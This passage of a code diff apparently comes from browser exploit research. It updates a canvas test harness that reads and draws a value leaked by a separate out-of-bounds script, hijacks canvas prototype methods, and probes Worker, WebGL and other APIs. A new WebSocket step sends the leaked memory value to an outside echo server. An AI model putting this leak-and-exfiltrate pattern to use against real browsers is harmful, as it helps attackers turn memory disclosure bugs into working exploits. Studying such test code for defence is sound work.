                 if (!canvasEl) throw new Error('Elemento Canvas não fornecido');
-                ctx_final = canvasEl.getContext('2d'); // Usa var local renomeada
+                ctx_final = canvasEl.getContext('2d');
                 if (!ctx_final) throw new Error('Contexto 2D não disponível');
                 localLog("Contexto Canvas 2D obtido.", 'good');
+
                 // Função para redesenhar tudo
-                const redrawAll_final = (leakData) => { // Renomeado
+                const redrawAll_final = () => { // Removido parâmetro leakData, usa global 'currentLeakData_final'
                     if (!ctx_final || !canvasEl) return;
                     try {
                         ctx_final.clearRect(0, 0, canvasEl.width, canvasEl.height);
                         ctx_final.fillStyle = "#334"; ctx_final.fillRect(0, 0, canvasEl.width, canvasEl.height);
-                        drawInteractiveAreas_final(ctx_final, canvasEl, outputDivEl); // Usa func renomeada
-                        if(leakData){
-                           ctx_final.fillStyle = leakData.color; ctx_final.font = "12px monospace";
-                           ctx_final.textAlign = "start"; ctx_final.fillText(leakData.text, 10, canvasEl.height - 10);
-                        }
+                        drawInteractiveAreas_final(ctx_final, canvasEl, outputDivEl);
+                        // Desenha leak info (usa a variável global atualizada)
+                        ctx_final.fillStyle = currentLeakData_final.color; ctx_final.font = "12px monospace";
+                        ctx_final.textAlign = "start"; ctx_final.fillText(currentLeakData_final.text, 10, canvasEl.height - 10);
                     } catch(e) { localLog(`Erro redrawAll: ${e.message}`, 'error'); }
                 };
-                redrawAll_final(null);
+                redrawAll_final(); // Desenho inicial
                 localLog("Setup básico do Canvas OK.", 'good');
                 await PAUSE();
 
                 // 2. Interação: Ler valor do Script 1
                 localLog("Verificando valor vazado do Script 1 (leakedValueFromOOB)...", 'subtest');
-                localLog("(Execute Script 1 primeiro e verifique consistência do leak em múltiplas execuções)", "info"); // Nota sobre consistência
-                let leakDataForDrawing = { text: "Leak(S1): NULO", color: "#FFC107" };
+                localLog("(Execute Script 1 primeiro. Verifique consistência do leak.)", "info");
                 try {
                     if (typeof leakedValueFromOOB !== 'undefined') {
                          const leak = leakedValueFromOOB;
                          if (leak) {
                              const leakStr = leak.type === 'U64' ? `Leak(S1): U64 H=${toHex(leak.high)} L=${toHex(leak.low)} @${leak.offset}` : `Leak(S1): U32 ${toHex(leak.low)} @${leak.offset}`;
                              localLog(`-> Valor encontrado: ${leakStr}`, 'leak');
-                             leakDataForDrawing = { text: leakStr, color: "#FF9800" };
-                         } else { localLog(`-> Valor NULO.`, 'warn'); }
-                    } else { localLog(`-> Var global 'leakedValueFromOOB' N/A.`, 'error'); leakDataForDrawing = { text: "Leak(S1): Var N/A", color: "#F44336" }; }
-                } catch (e) { localLog(`Erro ao acessar leak: ${e.message}`, 'error'); leakDataForDrawing = { text: "Leak(S1): ERRO", color: "#F44336" }; }
-                redrawAll_final(leakDataForDrawing);
+                             currentLeakData_final = { text: leakStr, color: "#FF9800" }; // Atualiza global
+                         } else { localLog(`-> Valor NULO.`, 'warn'); currentLeakData_final = { text: "Leak(S1): NULO", color: "#FFC107" }; }
+                    } else { localLog(`-> Var global 'leakedValueFromOOB' N/A.`, 'error'); currentLeakData_final = { text: "Leak(S1): Var N/A", color: "#F44336" }; }
+                } catch (e) { localLog(`Erro ao acessar leak: ${e.message}`, 'error'); currentLeakData_final = { text: "Leak(S1): ERRO", color: "#F44336" }; }
+                redrawAll_final(); // Redesenha com info do leak
                 localLog("Info do Leak processada e desenhada.", 'info');
                 await PAUSE();
 
@@ -293,154 +117,256 @@
 
                 // 3. Testes de Robustez
                 localLog("Iniciando Testes de Robustez...", 'test');
-                try { /* ... (código robustez omitido - igual v7) ... */
-                    ctx_final.fillStyle = "rgba(255,0,0,0.5)"; ctx_final.fillRect(1e9, 10, 10, 10); ctx_final.fillRect(10, -1e9, 10, 10); ctx_final.fillRect(5, 5, 1e8, 1e8);
-                    localLog("fillRect com valores extremos não crashou.", 'good'); await PAUSE();
-                    const originalLW = ctx_final.lineWidth; ctx_final.lineWidth = Infinity; localLog(`lineWidth=Infinity (atual: ${ctx_final.lineWidth})`, 'info');
-                    ctx_final.beginPath(); ctx_final.moveTo(200, 50); ctx_final.lineTo(250, 50); ctx_final.stroke(); ctx_final.lineWidth = originalLW;
-                    ctx_final.fillStyle = "yellow"; ctx_final.beginPath(); ctx_final.arc(NaN, 150, 5, 0, Math.PI * 2); ctx_final.fill();
-                    localLog("Testes com NaN/Infinity não crasharam.", 'warn');
-                } catch(e) { localLog(`Erro nos testes de robustez: ${e.message}`, 'error'); }
+                try { /* ... (igual v8) ... */ ctx_final.fillStyle = "rgba(255,0,0,0.5)"; ctx_final.fillRect(1e9, 10, 10, 10); ctx_final.fillRect(10, -1e9, 10, 10); ctx_final.fillRect(5, 5, 1e8, 1e8); localLog("fillRect extremos OK.", 'good'); await PAUSE(10); const oLW=ctx_final.lineWidth; ctx_final.lineWidth=Infinity; localLog(`lineWidth=Infinity (atual: ${ctx_final.lineWidth})`, 'info'); ctx_final.beginPath(); ctx_final.moveTo(200, 50); ctx_final.lineTo(250, 50); ctx_final.stroke(); ctx_final.lineWidth=oLW; ctx_final.fillStyle="yellow"; ctx_final.beginPath(); ctx_final.arc(NaN, 150, 5, 0, Math.PI*2); ctx_final.fill(); localLog("NaN/Infinity OK.", 'warn'); } catch(e) { localLog(`Erro robustez: ${e.message}`, 'error'); }
                 localLog("--- Testes de Robustez Concluídos ---", 'test');
                 await PAUSE();
 
                 // 4. Teste de Stress (Pixel R/W)
                 localLog("Iniciando Teste de Stress (Pixel R/W)...", 'test');
-                 try { /* ... (código stress omitido - igual v7) ... */
-                     const stressArea = { x: 0, y: 0, w: 20, h: 20 }; const stressIterations = 100;
-                     const startTime = performance.now();
-                     for (let i = 0; i < stressIterations; i++) { const imageData = ctx_final.getImageData(stressArea.x, stressArea.y, stressArea.w, stressArea.h); if (!imageData || !imageData.data) throw new Error("Falha getImageData"); const data = imageData.data; for (let j = 0; j < data.length; j += 4) { data[j]=255-data[j]; data[j+1]=255-data[j+1]; data[j+2]=255-data[j+2]; } ctx_final.putImageData(imageData, stressArea.x, stressArea.y); }
-                     const endTime = performance.now(); localLog(`Teste de Stress R/W concluído (${stressIterations} it) em ${(endTime - startTime).toFixed(1)} ms.`, 'good');
-                 } catch (e) { localLog(`Erro teste stress R/W: ${e.message}`, 'error'); console.error("Erro Stress R/W:", e); }
+                try { /* ... (igual v8) ... */ const sA = {x:0,y:0,w:20,h:20}; const sI=100; const sT=performance.now(); for(let i=0;i<sI;i++){const iD=ctx_final.getImageData(sA.x,sA.y,sA.w,sA.h); if(!iD||!iD.data)throw new Error("getImageData fail"); const d=iD.data; for(let j=0;j<d.length;j+=4){d[j]=255-d[j];d[j+1]=255-d[j+1];d[j+2]=255-d[j+2];} ctx_final.putImageData(iD,sA.x,sA.y);} const eT=performance.now(); localLog(`Stress R/W OK (${sI} it) ${ (eT - sT).toFixed(1)} ms.`, 'good'); } catch (e) { localLog(`Erro stress R/W: ${e.message}`, 'error'); }
                 localLog("--- Teste de Stress Concluído ---", 'test');
                 await PAUSE();
 
-                // 5. Teste de PP Hijack em fillRect
-                localLog("Iniciando Teste de PP Hijack (fillRect)...", 'test');
-                const originalFillRect_final = CanvasRenderingContext2D.prototype.fillRect; // Renomeado
-                let hijackCalled_final = false; // Renomeado
+                // 5. Teste de PP Hijack (fillRect, strokeText, drawImage)
+                localLog("Iniciando Testes de PP Hijack Canvas...", 'test');
+                const methodsToTest = ['fillRect', 'strokeText', 'drawImage'];
+                const originalMethods = {};
+                let ppVulnDetected = false;
                 try {
-                    CanvasRenderingContext2D.prototype.fillRect = function(...args) {
-                        console.log(`[CANVAS-VULN] fillRect HIJACKED! Args: ${JSON.stringify(args)}`);
-                        hijackCalled_final = true; // Usa var renomeada
-                        if(originalFillRect_final) { try { originalFillRect_final.apply(this, args); } catch(e){ console.error("Erro ao chamar original fillRect:", e); }}
-                    };
-                    hijackActive_final = true; // Usa flag renomeada
-                    localLog("Prototype de fillRect sobrescrito.", 'warn');
-                    localLog("Chamando ctx.fillRect para testar hijack...", 'subtest');
-                    ctx_final.fillStyle = 'magenta'; ctx_final.fillRect(150, 150, 20, 20);
-                    await PAUSE();
-                    if(hijackCalled_final) { localLog("VULN: Hijack de fillRect confirmado (ver console)!", 'vuln');}
-                    else { localLog("FALHA: Hijack de fillRect não detectado.", 'error'); }
-                } catch(e) { localLog(`Erro PP Hijack: ${e.message}`, 'error'); console.error("Erro PP Hijack Canvas:", e);
-                } finally {
-                    CanvasRenderingContext2D.prototype.fillRect = originalFillRect_final; // Restaura
-                    hijackActive_final = false; // Usa flag renomeada
-                    localLog("Prototype de fillRect restaurado.", 'info');
-                    try { ctx_final.fillStyle='lime'; ctx_final.fillRect(155, 155, 10, 10); localLog("fillRect restaurado (verificar console).", 'info'); }
-                    catch (e) { localLog('Erro teste pós-restauração.', 'warn');}
+                    for (const methodName of methodsToTest) {
+                        localLog(`Testando hijack de ${methodName}...`, 'subtest');
+                        if (typeof CanvasRenderingContext2D.prototype[methodName] !== 'function') {
+                            localLog(`Método ${methodName} não existe no prototype. Pulando.`, 'warn');
+                            continue;
+                        }
+                        originalMethods[methodName] = CanvasRenderingContext2D.prototype[methodName];
+                        let hijackCalled = false;
+                        CanvasRenderingContext2D.prototype[methodName] = function(...args) {
+                            console.log(`[CANVAS-VULN] ${methodName} HIJACKED! Args: ${JSON.stringify(args)}`);
+                            hijackCalled = true;
+                            if(originalMethods[methodName]) {
+                                try { return originalMethods[methodName].apply(this, args); } // Retorna valor original se houver
+                                catch(e){ console.error(`Erro ao chamar ${methodName} original:`, e); }
+                            }
+                        };
+                        hijackActive_final = true;
+                        // Tenta chamar o método hijackado
+                        try {
+                            switch(methodName) {
+                                case 'fillRect': ctx_final.fillStyle='magenta'; ctx_final.fillRect(150, 150, 5, 5); break;
+                                case 'strokeText': ctx_final.strokeStyle='cyan'; ctx_final.strokeText('HIJACK?', 150, 165); break;
+                                case 'drawImage':
+                                    // Precisa de uma imagem/canvas fonte. Usa o próprio canvas.
+                                    try { ctx_final.drawImage(canvasEl, 0, 0, 10, 10, 150, 170, 10, 10); }
+                                    catch (e) { localLog(`Erro ao chamar drawImage hijackado: ${e.message}`, 'warn'); } // Pode dar erro de tipo ou recursão se não restaurado
+                                    break;
+                            }
+                            await PAUSE(10); // Pausa curta para console log
+                            if(hijackCalled) { localLog(` VULN: Hijack de ${methodName} confirmado (ver console)!`, 'vuln'); ppVulnDetected = true; }
+                            else { localLog(` FALHA: Hijack de ${methodName} não detectado.`, 'error'); }
+                        } catch (callError) {
+                             localLog(` Erro ao chamar ${methodName} hijackado: ${callError.message}`, 'error');
+                        } finally {
+                             // Restaura este método específico
+                             if(originalMethods[methodName]) CanvasRenderingContext2D.prototype[methodName] = originalMethods[methodName];
+                             hijackActive_final = false;
+                             localLog(` ${methodName} restaurado.`, 'info');
+                        }
+                    } // Fim do loop for
+                } catch(e) {
+                    localLog(`Erro GERAL durante teste PP Hijack: ${e.message}`, 'error');
+                    console.error("Erro PP Hijack Canvas:", e);
+                    // Tenta restaurar todos em caso de erro geral
+                    for(const methodName in originalMethods) { CanvasRenderingContext2D.prototype[methodName] = originalMethods[methodName]; }
+                    hijackActive_final = false;
                 }
-                localLog("--- Teste de PP Hijack Concluído ---", 'test');
+                localLog(`--- Teste de PP Hijack Concluído (Vuln Detectada: ${ppVulnDetected}) ---`, 'test');
                 await PAUSE();
 
                 // 6. Verificação de Ambiente (Worker, Wasm, Globals)
                 localLog("Iniciando Verificação de Ambiente...", 'test');
-                try { /* ... (código env check omitido - igual v7) ... */
-                    localLog(`Web Worker suportado? ${typeof Worker !== 'undefined'}`, typeof Worker !== 'undefined' ? 'info' : 'warn');
-                    localLog(`WebAssembly suportado? ${typeof WebAssembly !== 'undefined'}`, typeof WebAssembly !== 'undefined' ? 'info' : 'warn');
-                    localLog("Verificando algumas props globais (window)...", 'subtest'); let count=0; const maxLog=20; for(const key in window){ if(count<maxLog&&(key.toUpperCase()===key||key.startsWith('webkit')||key.startsWith('moz')||key.toLowerCase().includes('ps'))){localLog(` -> window.${key}`,'info');count++;}else if(count>=maxLog&&key.includes('ps')&&count<maxLog+5){localLog(` -> window.${key} (extra PS?)`,'info');count++;}} if(count>=maxLog)localLog(` -> ... (mais props omitidas)`);
-                } catch(e) { localLog(`Erro ao verificar ambiente: ${e.message}`, 'error');}
+                try { /* ... (igual v8) ... */ localLog(`Worker? ${typeof Worker !== 'undefined'}`, typeof Worker !== 'undefined' ? 'info' : 'warn'); localLog(`Wasm? ${typeof WebAssembly !== 'undefined'}`, typeof WebAssembly !== 'undefined' ? 'info' : 'warn'); localLog("Globals...", 'subtest'); let c=0; const mL=20; for(const k in window){ if(c<mL&&(k.toUpperCase()===k||k.startsWith('webkit')||k.startsWith('moz')||k.toLowerCase().includes('ps'))){localLog(` -> win.${k}`,'info');c++;}else if(c>=mL&&k.includes('ps')&&c<mL+5){localLog(` -> win.${k}(+)`,'info');c++;}} if(c>=mL)localLog(` -> ...`); } catch(e) { localLog(`Erro env check: ${e.message}`, 'error');}
                 localLog("--- Verificação de Ambiente Concluída ---", 'test');
                 await PAUSE();
 
                 // 7. Verificação WebGL
                 localLog("Iniciando Verificação WebGL...", 'test');
-                 try { /* ... (código WebGL check omitido - igual v7) ... */
-                    let gl = canvasEl.getContext('webgl') || canvasEl.getContext('experimental-webgl');
-                    if(gl){ localLog(`WebGL obtido! V: ${gl.getParameter(gl.VERSION)}`, 'vuln'); try {let gl2 = canvasEl.getContext('webgl2') || canvasEl.getContext('experimental-webgl2'); if(gl2) localLog(`WebGL2 TAMBÉM obtido! V: ${gl2.getParameter(gl2.VERSION)}`, 'vuln'); else localLog('WebGL2 NÃO disponível.', 'info'); } catch(e2) {localLog(`Erro WebGL2: ${e2.message}`,'warn');} }
-                    else { localLog('WebGL (1/exp) NÃO disponível.', 'good'); }
-                 } catch(e) { localLog(`Erro WebGL: ${e.message}`, 'error'); console.error("Erro WebGL:", e); }
+                 try { /* ... (igual v8) ... */ let gl=canvasEl.getContext('webgl')||canvasEl.getContext('experimental-webgl'); if(gl){localLog(`WebGL OK! V:${gl.getParameter(gl.VERSION)}`,'vuln');try{let gl2=canvasEl.getContext('webgl2')||canvasEl.getContext('experimental-webgl2');if(gl2)localLog(`WebGL2 OK! V:${gl2.getParameter(gl2.VERSION)}`,'vuln');else localLog('WebGL2 N/A.','info');}catch(e2){localLog(`Err GL2:${e2.message}`,'warn');}}else{localLog('WebGL N/A.','good');}} catch(e){localLog(`Err GL:${e.message}`,'error');}
                 localLog("--- Verificação WebGL Concluída ---", 'test');
                 await PAUSE();
 
-                // 8. **NOVO**: Verificação de Outras APIs
+                // 8. Verificação de Outras APIs
                 localLog("Iniciando Verificação de Outras APIs...", 'test');
-                try {
-                    localLog(`WebSocket suportado? ${'WebSocket' in window}`, 'WebSocket' in window ? 'info' : 'warn');
-                    const rtcKey = ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection'].find(k => k in window);
-                    localLog(`WebRTC (RTCPeerConnection) suportado? ${!!rtcKey}`, !!rtcKey ? 'info' : 'warn');
-                    localLog(`IndexedDB suportado? ${'indexedDB' in window}`, 'indexedDB' in window ? 'info' : 'warn');
-                    localLog(`Notifications suportado? ${'Notification' in window}`, 'Notification' in window ? 'info' : 'warn');
-                } catch(e) { localLog(`Erro ao verificar outras APIs: ${e.message}`, 'error'); }
+                try { /* ... (igual v8) ... */ localLog(`WebSocket? ${'WebSocket'in window}`,'info'); const rtcK=['RTCPeerConnection','webkitRTCPeerConnection','mozRTCPeerConnection'].find(k=>k in window); localLog(`WebRTC? ${!!rtcK}`,'warn'); localLog(`IndexedDB? ${'indexedDB'in window}`,'warn'); localLog(`Notifications? ${'Notification'in window}`,'warn'); } catch(e){localLog(`Erro API check:${e.message}`,'error');}
                 localLog("--- Verificação de Outras APIs Concluída ---", 'test');
                 await PAUSE();
 
-                // 9. **NOVO**: Verificação SVG Simples
+                // 9. Verificação SVG
                 localLog("Iniciando Verificação SVG...", 'test');
-                try {
-                     const svgNS = "http://www.w3.org/2000/svg";
-                     const svgEl = document.createElementNS(svgNS, "svg");
-                     if (svgEl && typeof svgEl.getAttributeNS === 'function') {
-                         svgEl.setAttributeNS(null, "width", "10");
-                         // document.body.appendChild(svgEl); // Não adiciona ao DOM, só verifica criação
-                         localLog(`Criação de elemento SVG e setAttributeNS OK.`, 'good');
-                         // document.body.removeChild(svgEl);
-                     } else {
-                         localLog(`Criação de elemento SVG falhou.`, 'error');
-                     }
-                } catch(e) { localLog(`Erro ao testar SVG: ${e.message}`, 'error'); }
+                try { /* ... (igual v8) ... */ const svgNS="http://www.w3.org/2000/svg"; const svgEl=document.createElementNS(svgNS,"svg"); if(svgEl&&typeof svgEl.getAttributeNS==='function'){svgEl.setAttributeNS(null,"width","10"); localLog(`SVG OK.`, 'good');}else{localLog(`SVG falhou.`, 'error');}} catch(e){localLog(`Erro SVG:${e.message}`,'error');}
                 localLog("--- Verificação SVG Concluída ---", 'test');
                 await PAUSE();
 
-                // 10. Adicionar Listeners Finais (Click e Hover - Mantido)
+                // 10. **NOVO**: Teste Web Worker
+                localLog("Iniciando Teste Web Worker...", 'test');
+                if (typeof Worker !== 'undefined') {
+                    let worker = null;
+                    let workerObjUrl = null;
+                    try {
+                        const workerCode = `
+                            console.log('[WORKER] Worker iniciado.');
+                            self.onmessage = function(e) {
+                                console.log('[WORKER] Mensagem recebida:', e.data);
+                                let result = 'Pong: ' + e.data;
+                                // Tentar acessar algo do Canvas (não deve funcionar)
+                                try {
+                                     // let ctx = new CanvasRenderingContext2D(); // Erro esperado
+                                     // self.postMessage('Canvas access attempted from worker.');
+                                } catch(canvasErr) {
+                                     // self.postMessage('Canvas access failed in worker as expected: ' + canvasErr.message);
+                                }
+                                // Tentar ler a variável global do script 1 (não deve funcionar)
+                                try {
+                                     if(typeof leakedValueFromOOB !== 'undefined') {
+                                         result += ' | leakedValueFromOOB found in worker? NO (isolation ok)';
+                                     }
+                                } catch(leakErr) { /* Expected */ }
+                                self.postMessage(result);
+                            };
+                            console.log('[WORKER] Listener de mensagem configurado.');
+                        `;
+                        const blob = new Blob([workerCode], {type: 'application/javascript'});
+                        workerObjUrl = URL.createObjectURL(blob);
+                        localLog(`Worker Blob URL criado: ${workerObjUrl}`, 'info');
+
+                        worker = new Worker(workerObjUrl);
+                        localLog(`Worker criado com sucesso.`, 'good');
+
+                        worker.onmessage = function(e) {
+                            localLog(`Mensagem recebida do Worker: ${e.data}`, 'good');
+                            console.log("Mensagem do Worker:", e.data);
+                            // Termina o worker após receber resposta para limpar recursos
+                            if(worker) worker.terminate();
+                            localLog("Worker terminado.", 'info');
+                        };
+                        worker.onerror = function(e) {
+                            localLog(`Erro no Worker: ${e.message} (Linha: ${e.lineno}, Ficheiro: ${e.filename})`, 'error');
+                            console.error("Erro no Worker:", e);
+                            if(worker) worker.terminate(); // Tenta terminar mesmo em erro
+                        };
+
+                        localLog("Enviando 'Ping' para o Worker...", 'info');
+                        worker.postMessage('Ping from main');
+
+                        // Limpa o Object URL depois de um tempo (worker já deve ter carregado)
+                        setTimeout(() => {
+                            if (workerObjUrl) {
+                                URL.revokeObjectURL(workerObjUrl);
+                                localLog("Worker Blob URL revogado.", 'info');
+                            }
+                        }, 2000); // Aumentado para 2s
+
+                    } catch(e) {
+                        localLog(`Erro ao criar/usar Worker: ${e.message}`, 'error');
+                        console.error("Erro Worker:", e);
+                        if(worker) worker.terminate(); // Tenta terminar se worker foi criado mas deu erro depois
+                        if(workerObjUrl) URL.revokeObjectURL(workerObjUrl); // Limpa URL se deu erro
+                    }
+                } else {
+                    localLog("Web Workers não suportados neste ambiente.", 'warn');
+                }
+                localLog("--- Teste Web Worker Concluído (verificar logs assíncronos) ---", 'test');
+                await PAUSE();
+
+                // 11. **NOVO**: Teste WebSocket
+                localLog("Iniciando Teste WebSocket...", 'test');
+                if (typeof WebSocket !== 'undefined') {
+                    let ws = null;
+                    const wsUrl = "wss://echo.websocket.org/"; // Servidor público de echo
+                    localLog(`Tentando conectar a: ${wsUrl}`, 'info');
+                    try {
+                        ws = new WebSocket(wsUrl);
+
+                        ws.onopen = function(event) {
+                            localLog(`WebSocket Conectado! Estado: ${ws.readyState}`, 'good');
+                            const message = "Teste WebSocket - " + new Date().toLocaleTimeString();
+                            localLog(`Enviando mensagem: "${message}"`, 'info');
+                            ws.send(message);
+                            // Tenta enviar leak se existir
+                             if (typeof leakedValueFromOOB !== 'undefined' && leakedValueFromOOB) {
+                                 const leakStr = `Leak S1: ${JSON.stringify(leakedValueFromOOB)}`;
+                                 localLog(`Enviando leak via WS: "${leakStr}"`, 'leak');
+                                 ws.send(leakStr);
+                             }
+                             // Fecha após enviar
+                             setTimeout(() => { if(ws && ws.readyState === WebSocket.OPEN) ws.close(); }, 500);
+                        };
+
+                        ws.onmessage = function(event) {
+                            localLog(`Mensagem recebida do WS: ${event.data}`, 'good');
+                        };
+
+                        ws.onerror = function(event) {
+                            // O evento de erro muitas vezes não tem detalhes úteis por segurança
+                            localLog(`Erro no WebSocket! Estado: ${ws.readyState}. Verifique a consola e conectividade.`, 'error');
+                            console.error("WebSocket Error Event:", event);
+                        };
+
+                        ws.onclose = function(event) {
+                            localLog(`WebSocket Fechado. Código: ${event.code}, Razão: "${event.reason}", Limpo: ${event.wasClean}`, 'info');
+                        };
+
+                    } catch (e) {
+                        localLog(`Erro ao criar WebSocket: ${e.message}`, 'error');
+                        console.error("Erro WebSocket:", e);
+                    }
+                } else {
+                    localLog("WebSockets não suportados neste ambiente.", 'warn');
+                }
+                localLog("--- Teste WebSocket Concluído (verificar logs assíncronos) ---", 'test');
+                await PAUSE(1000); // Pausa maior para dar tempo à conexão WS
+
+                // 12. Adicionar Listeners Finais (Click e Hover)
                 localLog("Adicionando listeners 'click' e 'mousemove' finais...", 'subtest');
-                // ... (código dos listeners omitido para brevidade - é o mesmo da v7, usando nomes _final) ...
-                 if(canvasClickListenerCanvas_final && canvasEl) { try { canvasEl.removeEventListener('click', canvasClickListenerCanvas_final); } catch(e){} }
-                 if(canvasMoveListenerCanvas_final && canvasEl) { try { canvasEl.removeEventListener('mousemove', canvasMoveListenerCanvas_final); } catch(e){} }
-                 canvasMoveListenerCanvas_final = (event) => { /* ... lógica hover ... */ try{ const rect = canvasEl.getBoundingClientRect(); const x = event.clientX-rect.left; const y = event.clientY-rect.top; let foundTarget=null; for(const area of interactiveAreas_final){ if(x>=area.x && x<=area.x+area.w && y>=area.y && y<=area.y+area.h){foundTarget=area.id;break;}} if(foundTarget!==currentHoverTarget_final){ currentHoverTarget_final=foundTarget; redrawAll_final(leakDataForDrawing); canvasEl.style.cursor=foundTarget?'pointer':'default';} if(coordStatusDivEl)coordStatusDivEl.textContent = `Canvas Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`; }catch(e){} };
-                 canvasClickListenerCanvas_final = (event) => { /* ... lógica click ... */ try{ const rect=canvasEl.getBoundingClientRect(); const x=event.clientX-rect.left; const y=event.clientY-rect.top; let clickedArea=null; for(const area of interactiveAreas_final){ if(x>=area.x && x<=area.x+area.w && y>=area.y && y<=area.y+area.h){clickedArea=area;break;}} if(clickedArea){ localLog(`--> Click área: ${clickedArea.text}`, 'vuln'); switch(clickedArea.id){ case 'rect-log': localLog("Ação: Log Simples", 'info'); break; case 'rect-link': localLog("Ação: Abrir Link...", 'warn'); try{const newW=window.open('https://google.com','_blank'); if(!newW)localLog('Falha (bloqueado?).','warn'); else localLog('Comando window.open OK.','good');}catch(e){localLog('Erro window.open: '+e.message,'error');} break; case 'rect-rerun': localLog("Ação: Re-ler Leak S1...", 'info'); try{if(typeof leakedValueFromOOB !== 'undefined'){const leak=leakedValueFromOOB; if(leak){const leakStr=leak.type==='U64'?`ReL(S1): U64 H=${toHex(leak.high)} L=${toHex(leak.low)} @${leak.offset}`:`ReL(S1): U32 ${toHex(leak.low)} @${leak.offset}`; localLog(`-> Valor ${leakStr}`,'leak'); leakDataForDrawing={text:leakStr,color:"#FF9800"};}else{localLog(`-> Valor NULO.`,'warn');leakDataForDrawing={text:"ReL(S1): NULO",color:"#FFC107"};}}else{localLog(`-> Var N/A.`,'error');leakDataForDrawing={text:"ReL(S1): Var N/A",color:"#F44336"};}}catch(e){localLog(`Erro re-ler: ${e.message}`,'error');leakDataForDrawing={text:"ReL(S1): ERRO",color:"#F44336"};} redrawAll_final(leakDataForDrawing); break; } }else{ localLog(`--> Click fora. x=${x.toFixed(0)}, y=${y.toFixed(0)}`,'info');}}catch(e){localLog(`Erro click: ${e.message}`,'error');console.error(e);} };
-                 canvasEl.addEventListener('click', canvasClickListenerCanvas_final);
-                 canvasEl.addEventListener('mousemove', canvasMoveListenerCanvas_final);
+                // ... (código dos listeners omitido - igual v8) ...
+                 if(canvasClickListenerCanvas_final && canvasEl) { try { canvasEl.removeEventListener('click', canvasClickListenerCanvas_final); } catch(e){} } if(canvasMoveListenerCanvas_final && canvasEl) { try { canvasEl.removeEventListener('mousemove', canvasMoveListenerCanvas_final); } catch(e){} } canvasMoveListenerCanvas_final = (event) => { try{ const r=canvasEl.getBoundingClientRect(); const x=event.clientX-r.left; const y=event.clientY-r.top; let fT=null; for(const a of interactiveAreas_final){if(x>=a.x&&x<=a.x+a.w&&y>=a.y&&y<=a.y+a.h){fT=a.id;break;}} if(fT!==currentHoverTarget_final){currentHoverTarget_final=fT; redrawAll_final(); canvasEl.style.cursor=fT?'pointer':'default';} if(coordStatusDivEl)coordStatusDivEl.textContent=`Coords:X=${x.toFixed(0)},Y=${y.toFixed(0)}`; }catch(e){} }; canvasClickListenerCanvas_final = (event) => { try{ const r=canvasEl.getBoundingClientRect(); const x=event.clientX-r.left; const y=event.clientY-r.top; let cA=null; for(const a of interactiveAreas_final){if(x>=a.x&&x<=a.x+a.w&&y>=a.y&&y<=a.y+a.h){cA=a;break;}} if(cA){localLog(`--> Click área: ${cA.text}`,'vuln'); switch(cA.id){ case 'rect-log': localLog("Ação: Log",'info'); break; case 'rect-link': localLog("Ação: Link...",'warn'); try{const nW=window.open('https://google.com','_blank');if(!nW)localLog('Falha.','warn'); else localLog('window.open OK.','good');}catch(e){localLog('Erro win.open: '+e.message,'error');} break; case 'rect-rerun': localLog("Ação: Re-ler S1...",'info'); try{if(typeof leakedValueFromOOB !=='undefined'){const l=leakedValueFromOOB; if(l){const lS=l.type==='U64'?`ReL(S1):U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}`:`ReL(S1):U32 ${toHex(l.low)} @${l.offset}`; localLog(`-> ${lS}`,'leak'); currentLeakData_final={text:lS,color:"#FF9800"};}else{localLog(`-> NULO.`,'warn');currentLeakData_final={text:"ReL(S1):NULO",color:"#FFC107"};}}else{localLog(`-> Var N/A.`,'error');currentLeakData_final={text:"ReL(S1):Var N/A",color:"#F44336"};}}catch(e){localLog(`Erro re-ler:${e.message}`,'error');currentLeakData_final={text:"ReL(S1):ERRO",color:"#F44336"};} redrawAll_final(); break; }}else{localLog(`--> Click fora. x=${x.toFixed(0)}, y=${y.toFixed(0)}`,'info');}}catch(e){localLog(`Erro click:${e.message}`,'error');console.error(e);} }; canvasEl.addEventListener('click', canvasClickListenerCanvas_final); canvasEl.addEventListener('mousemove', canvasMoveListenerCanvas_final);
                  localLog("Listeners 'click' e 'mousemove' adicionados.", 'good');
                  localLog("Passe o mouse e clique nas áreas coloridas!", 'info');
-
 
             } catch(e) {
                  localLog(`Erro GERAL INESPERADO teste Canvas: ${e.message}`, 'error');
                  console.error("Erro geral no teste do Canvas:", e);
             } finally {
-                 localLog("--- Teste Exploração Total Canvas CONCLUÍDO ---", 'test');
+                 localLog("--- Teste Exploração FINAL Canvas v9 CONCLUÍDO ---", 'test');
                  if (runBtnEl) runBtnEl.disabled = false;
             }
         };
 
-        // --- Função chamada pelo botão do Canvas (Final) ---
-        const runCanvasTest = async () => { // Renomeado
+        // --- Função chamada pelo botão do Canvas (Final v9) ---
+        const runCanvasTest = async () => {
             const canvasOutputDiv = document.getElementById('output-canvas');
-            logCanvas_final(canvasOutputDiv, "Botão 'Iniciar Teste de Canvas' clicado.", "info"); // Usa log renomeado
+            logCanvas_final(canvasOutputDiv, "Botão 'Iniciar Teste de Canvas' clicado.", "info");
 
-            console.log("Canvas Exploração Final: Tentando obter elementos...");
+            console.log("Canvas Exploração FINAL v9: Tentando obter elementos...");
             const canvasRunBtn = document.getElementById('runCanvasBtn');
             const canvasElement = document.getElementById('interactive-canvas');
             const coordStatusDivCanvas = document.getElementById('canvas-coord-status');
 
             if (!canvasOutputDiv || !canvasRunBtn || !canvasElement || !coordStatusDivCanvas) {
-                const errorMsg = "ERRO FATAL: Elementos HTML essenciais p/ Canvas não encontrados!";
-                logCanvas_final(canvasOutputDiv, errorMsg, "error"); console.error(errorMsg); return;
+                 const errorMsg = "ERRO FATAL: Elementos HTML essenciais p/ Canvas não encontrados!";
+                 logCanvas_final(canvasOutputDiv, errorMsg, "error"); console.error(errorMsg); return;
             }
             logCanvas_final(canvasOutputDiv, "Elementos Canvas encontrados.", "good");
             if (canvasRunBtn) canvasRunBtn.disabled = true;
-            logCanvas_final(canvasOutputDiv, "Iniciando teste principal de exploração final...", "info");
-            await testComprehensiveCanvasFinal(canvasElement, canvasOutputDiv, coordStatusDivCanvas, canvasRunBtn); // Chama func renomeada
+            logCanvas_final(canvasOutputDiv, "Iniciando teste principal de exploração FINAL v9...", "info");
+            await testComprehensiveCanvasFinalV9(canvasElement, canvasOutputDiv, coordStatusDivCanvas, canvasRunBtn); // Chama func final
         };
 
-         // --- Limpeza (Final) ---
+         // --- Limpeza (Final v9) ---
          window.addEventListener('unload', () => {
-             try { /* ... (código limpeza omitido - igual v7, usa nomes _final) ... */
